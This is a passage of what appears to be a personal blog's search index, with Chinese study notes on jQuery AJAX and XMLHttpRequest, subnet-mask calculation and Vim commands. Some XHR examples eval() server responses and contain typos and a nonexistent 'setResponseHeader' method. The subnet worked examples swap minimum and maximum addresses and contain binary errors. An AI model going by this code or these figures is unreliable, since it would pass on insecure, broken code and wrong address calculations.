+ <span class="string">&quot;状态:&quot;</span> + status);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="getScript"><a href="#getScript" class="headerlink" title="$.getScript()"></a>$.getScript()</h3><p>使用 AJAX 的 HTTP GET 请求获取和执行 JavaScrip,可选参数url,success(response,status)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;button&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.getScript(<span class="string">&quot;demo_ajax_script.js&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="load"><a href="#load" class="headerlink" title="load()"></a>load()</h3><p>把test.txt内容加载到指定的 <div> 元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#div1&quot;</span>).load(url,data,callback);  </span><br><span class="line"><span class="comment">//callback函数参数1：responseTxt(结果) 参数2：statusTXT(状态) xhr：xhr 对象</span></span><br><span class="line"><span class="comment">// eg : function(responseTxt,statusTxt,xhr)</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).load(<span class="string">&quot;test.txt&quot;</span>);   <span class="comment">//内容加载到指定的 &lt;div&gt; 元素中</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).load(<span class="string">&quot;test.txt #p1&quot;</span>); <span class="comment">//test.txt文件中 id=&quot;p1&quot; 的元素的内容，加载到指定的 &lt;div&gt; 元素中</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="getJSON"><a href="#getJSON" class="headerlink" title="$.getJSON()"></a>$.getJSON()</h3><p>使用 AJAX 的 HTTP GET 请求获取 JSON 数据。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(<span class="string">&quot;https://www.b.com/jsonp.php?jsoncallback=?&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + data[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    $(<span class="string">&#x27;#divCustomers&#x27;</span>).html(html); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h2><p>XMLHttpRequest 对象提供了对 HTTP 协议的完全的访问，包括做出 POST 和 HEAD 请求以及普通的 GET 请求的能力。</p><h3 id="创建XMLHttprequest"><a href="#创建XMLHttprequest" class="headerlink" title="创建XMLHttprequest"></a>创建XMLHttprequest</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest()   <span class="comment">//现代浏览器</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)   <span class="comment">//IE 5.6及古老版本</span></span><br></pre></td></tr></table></figure><h3 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;/try/ajax/demo_get2.php?fname=Henry&amp;lname=Ford&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><h3 id="Post-请求"><a href="#Post-请求" class="headerlink" title="Post 请求"></a>Post 请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;/try/ajax/demo.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xmlhttp.send(<span class="string">&quot;fname=Henry&amp;lname=Ford&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="获取响应数据"><a href="#获取响应数据" class="headerlink" title="获取响应数据"></a>获取响应数据</h3><p>readyState属性值</p><table><thead><tr><th>返回值</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>未初始化。表示对象已经建立，但是尚未初始化，尚未调用 open() 方法</td></tr><tr><td>1</td><td>初始化。表示对象已经建立，尚未调用 send() 方法</td></tr><tr><td>2</td><td>发送数据。表示 send() 方法已经调用，但是当前的状态及 HTTP 头未知</td></tr><tr><td>3</td><td>数据传送中。已经接收部分数据，因为响应及 HTTP 头不安全，这时通过 responseBody 和 responseText 获取部分数据会出现错误</td></tr><tr><td>4</td><td>完成。数据接收完毕，此时可以通过 responseBody 和 responseText 获取完整的响应数据</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;myDiv&quot;</span>).innerHTML=xmlhttp.responseText;</span><br></pre></td></tr></table></figure><h3 id="获取-HTML-字符串"><a href="#获取-HTML-字符串" class="headerlink" title="获取 HTML 字符串"></a>获取 HTML 字符串</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;向服务器发出请求&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//页面初始化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        b.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.xml&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState状态</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">if</span> (xhr.state == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> o = <span class="built_in">document</span>.getElementById(<span class="string">&quot;grid&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        o.innerHTML = xhr.responseText;  <span class="comment">//直接插入到页面中</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.send();  <span class="comment">//发送请求</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="获取-JavaScript-脚本"><a href="#获取-JavaScript-脚本" class="headerlink" title="获取 JavaScript 脚本"></a>获取 JavaScript 脚本</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;向服务器发出请求&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//页面初始化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        b.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.xml&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState状态</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">if</span> (xhr.state == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> info = xhr.responseText;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> o = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span> + info + <span class="string">&quot;)&quot;</span> + <span class="string">&quot;()&quot;</span>);  <span class="comment">//用eval()把字符串转换为脚本</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="built_in">console</span>.log(o);  <span class="comment">//返回客户端当前信息</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.send();  <span class="comment">//发送请求</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="获取-JSON-数据"><a href="#获取-JSON-数据" class="headerlink" title="获取 JSON 数据"></a>获取 JSON 数据</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;向服务器发出请求&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//页面初始化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        b.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.xml&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState状态</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">if</span> (xhr.state == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> info = xhr.responseText;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> o = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span> + info + <span class="string">&quot;)&quot;</span>);  <span class="comment">//调用eval()把字符串转换为本地脚本</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="built_in">console</span>.log(info);  <span class="comment">//显示JSON对象字符串</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="built_in">console</span>.log(o.user);  <span class="comment">//读取对象属性值，返回字符串“css8”</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.send();  <span class="comment">//发送请求</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="获取纯文本"><a href="#获取纯文本" class="headerlink" title="获取纯文本"></a>获取纯文本</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.txt&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span><br><span class="line">xhr.nreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState函数</span></span><br><span class="line">        <span class="keyword">if</span> (xhr.status == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span><br><span class="line">            <span class="keyword">var</span> info = xhr.responseText;</span><br><span class="line">            <span class="keyword">if</span> (info == <span class="string">&quot;true&quot;</span>) <span class="built_in">console</span>.log(<span class="string">&quot;文本信息传输完整&quot;</span>);  <span class="comment">//检测信息是否完整</span></span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">&quot;文本信息可能存在丢失&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.send();  <span class="comment">//发送请求</span></span><br></pre></td></tr></table></figure><h3 id="获取和设置头部消息"><a href="#获取和设置头部消息" class="headerlink" title="获取和设置头部消息"></a>获取和设置头部消息</h3><p>设置获取 HTTP 响应的所有头部消息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;server.txt&quot;</span>;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xhr.getAllResponseHeaders());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>设置HTTP响应的头部信息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xhr.setResponseHeader(<span class="string">&quot;Header-name&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">xhr.setResponseHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>更多参考：<a href="http://c.biancheng.net/view/5995.html">http://c.biancheng.net/view/5995.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子网掩码计算</title>
      <link href="/posts/49563/"/>
      <url>/posts/49563/</url>
      
        <content type="html"><![CDATA[<p>二进制转换表：</p><table><thead><tr><th>128</th><th>64</th><th>32</th><th>16</th><th>8</th><th>4</th><th>2</th><th>1</th></tr></thead><tbody><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr></tbody></table><p>如果值全为1，上面的数字全部相加等于255.</p><blockquote><p>例如<br>已知ip ：           141.14.72.24<br>已知子网掩码：255.255.255.128<br>求网段地址？</p></blockquote><table><thead><tr><th>目标IP</th><th>141</th><th>14</th><th>72</th><th>24</th></tr></thead><tbody><tr><td>目标ip二进制</td><td>10001101</td><td>00001110</td><td>01001000</td><td>00011000</td></tr><tr><td>子网掩码</td><td>11111111</td><td>11111111</td><td>11111111</td><td>10000000</td></tr><tr><td>最小ip范围</td><td><strong>1</strong>000<strong>11</strong>0<strong>1</strong></td><td>0000<strong>111</strong>0</td><td>0<strong>1</strong>00<strong>1</strong>000</td><td>00000000</td></tr></tbody></table><p>算最小ip范围取相同1</p><table><thead><tr><th>目标ip</th><th>141</th><th>14</th><th>72</th><th>24</th></tr></thead><tbody><tr><td>目标ip二进制</td><td>10001101</td><td>00001110</td><td>01001000</td><td>00011000</td></tr><tr><td>子网掩码</td><td><strong>11111111</strong></td><td><strong>11111111</strong></td><td><strong>11111111</strong></td><td><strong>1</strong>0000000</td></tr><tr><td>最大ip范围*</td><td>10001101</td><td>00001110</td><td>01001000</td><td>0<strong>1111111</strong></td></tr></tbody></table><p>*注：最大ip范围取目标前三段不变。</p><p>算最大ip范围，子网掩码相同的全部为不变，后面全填写1</p><p>最后转2进制得：</p><p>最小：141.14.72.0</p><p>最大：141.14.72.127</p><p>去掉一个广播地址：141.14.72.127</p><p>范围即是：141.14.72.0——141.14.72.127</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211222143630714.png" alt="image-20211222143630714"></p><p>141.14.72.24</p><p>255.255.192.0</p><p>子网掩码为</p><p>子网掩码<strong>11111111  1111111  11</strong>000000   0000000</p><p>最小子网10001101  0001110  01000000  0000000</p><p>最大子网10001101  0001110  0<strong>1111111  1111111</strong></p><p>即：</p><p>最大子网:141.14.64.0</p><p>最小子网:141.14.127.255</p><p>10.50.89.60/18</p><p>00001010     00110010    01011001   11111100</p><p>11111111     11111111    11000000   00000000</p><p>10.50.64.0</p><p>10.50.127.2</p><p>11111111 11111111 11111111 11111100</p>]]></content>
      
      
      
        <tags>
            
            <tag> 子网掩码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VIM基础使用</title>
      <link href="/posts/819/"/>
      <url>/posts/819/</url>
      
        <content type="html"><![CDATA[<p>VIM基础使用</p><pre><code> VI/VIM共有三种编辑模式，分别是：命令模式（Command mode）、输入模式（Insert mode）和底线命令模式（Last line mode）。</code></pre><h4 id="底线命令模式："><a href="#底线命令模式：" class="headerlink" title="底线命令模式："></a>底线命令模式：</h4><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211219200543758.png" alt="image-20211219200543758"></p><p>​    在命令模式下按：（英文冒号）就进入了底线命令模式。底线命令模式可以输入单个或多个字符命令在底线模式中，基本命令有：<br>◆ ESC：退出底线命令模式，切换到命令模式</p><table><thead><tr><th>底线命令模式</th><th>作用</th></tr></thead><tbody><tr><td>:w</td><td>将编辑的数据写入硬盘档案中(常用)</td></tr><tr><td>:w!</td><td>若文件属性为『只读』时，强制写入该档案。不过，到底能不能写入， 还是跟你对 该档案的档案权限有关啊！</td></tr><tr><td>:q</td><td>离开 vi (常用)</td></tr><tr><td>:q!</td><td>若曾修改过档案，又不想储存，使用 ! 为强制离开不储存档案。</td></tr><tr><td>:wq</td><td>储存后离开，若为 :wq! 则为强制储存后离开 (常用)</td></tr><tr><td>:n1,n2 w [filename]</td><td>将 n1 到 n2 的内容储存成 filename 这个档案。</td></tr><tr><td>:! command</td><td>暂时离开 vi 到指令行模式下执行 command 的显示结果。</td></tr></tbody></table><table><thead><tr><th>行号变更</th><th>作用</th></tr></thead><tbody><tr><td>:set nu</td><td>显示行号，设定之后，会在每一行的前缀显示该行的行号</td></tr><tr><td>:set nonu</td><td>与 set nu 相反，为取消行号！</td></tr></tbody></table><h4 id="一般模式"><a href="#一般模式" class="headerlink" title="一般模式"></a>一般模式</h4><table><thead><tr><th>光标移动方法</th><th>作用</th></tr></thead><tbody><tr><td>[Ctrl] + [f]</td><td>屏幕『向下』移动一页，相当于 [Page Down]按键 (常用)</td></tr><tr><td>[Ctrl] + [b]</td><td>屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)</td></tr><tr><td>0</td><td>或功能键[Home] 这是数字『 0 』：移动到光标所在行头</td></tr><tr><td>$</td><td>或功能键[End] 移动到这一行的行尾(常用)</td></tr><tr><td>G</td><td>移动到文档的最后一行(常用)</td></tr><tr><td>gg</td><td>移动到文档的第一行 (常用)</td></tr><tr><td>n<Enter></td><td>n 为数字。光标向下移动 n 行(常用)</td></tr></tbody></table><h5 id="一般模式下搜索替换指令说明："><a href="#一般模式下搜索替换指令说明：" class="headerlink" title="一般模式下搜索替换指令说明："></a>一般模式下搜索替换指令说明：</h5><table><thead><tr><th>搜索替换指令</th><th>作用</th></tr></thead><tbody><tr><td>/word</td><td>向光标之下查找为 word 的字符串。 (常用)</td></tr><tr><td>?word</td><td>向光标之上查找字为 word 的字符串。</td></tr><tr><td>n</td><td>这个 n 是英文按键。代表重复前一个搜寻的动作。</td></tr><tr><td>N</td><td>这个 N 是英文按键。与 n 刚好相反，为『反向』进行前一个搜寻动作</td></tr><tr><td><strong>:n1,n2s/word1/word2/g</strong></td><td><strong>n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为word2</strong></td></tr><tr><td><em><strong>:1,$s/word1/word2/g 或 :%s/word1/word2/g</strong></em></td><td><em><strong>从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！</strong></em></td></tr><tr><td>:1,$s/word1/word2/gc 或 :%s/word1/word2 /gc</td><td>从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用)</td></tr></tbody></table><h5 id="一般模式下删除、复制与粘贴常用方法说明："><a href="#一般模式下删除、复制与粘贴常用方法说明：" class="headerlink" title="一般模式下删除、复制与粘贴常用方法说明："></a>一般模式下删除、复制与粘贴常用方法说明：</h5><table><thead><tr><th>删除、复制与粘贴方法</th><th>作用</th></tr></thead><tbody><tr><td>x, X</td><td>在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于 [backspace] 亦即是退格键) (常用)  向光标前删除，向光标后删除</td></tr><tr><td>dd</td><td>删除游标所在的那一整行(常用</td></tr><tr><td>ndd</td><td>n 为数字。删除光标所在的向下 n 行，例如</td></tr><tr><td>yy</td><td>复制游标所在的那一行(常用)</td></tr><tr><td>nyy</td><td>n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行(常用)</td></tr><tr><td>p, P</td><td>p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！</td></tr><tr><td>u</td><td>复原前一个动作。(常用)</td></tr><tr><td>[Ctrl]+r</td><td>重做上一个动作。(常用)</td></tr><tr><td>.</td><td>不要怀疑！这就是小数点！意思是重复前一个动作的意思。 如果你想要重复删除、重复贴上等等动作，按下小数点『.』就好了！ (常用)</td></tr></tbody></table><h5 id="一般模式切换到编辑模式的方法说明："><a href="#一般模式切换到编辑模式的方法说明：" class="headerlink" title="一般模式切换到编辑模式的方法说明："></a>一般模式切换到编辑模式的方法说明：</h5><table><thead><tr><th>进入输入和取代模式方法</th><th>作用</th></tr></thead><tbody><tr><td>i, I</td><td>进入输入模式(Insert mode)：i 为『从目前光标所在处输入』， I 为『在目前所在行的第一个非空格符处开始输入』。(常用)</td></tr><tr><td>a, A</td><td>进入输入模式(Insert mode)：a 为『从目前光标所在的下一个字符处开始输入』， A 为『从光标所在行的最后一个字符处开始输入』。(常用)</td></tr><tr><td>o, O</td><td>进入输入模式(Insert mode)：o光标所在行后新开行,O光标所在行头新开行</td></tr><tr><td>r, R</td><td>进入取代模式(Replace mode)：r 只会取代光标所在的那一个字符一次；R会一直取代光标所在的文字，直到按下 ESC 为止；(常用)</td></tr><tr><td>[Esc]</td><td>退出编辑模式，回到一般模式中(常用)</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础</title>
      <link href="/posts/53226/"/>
      <url>/posts/53226/</url>
      
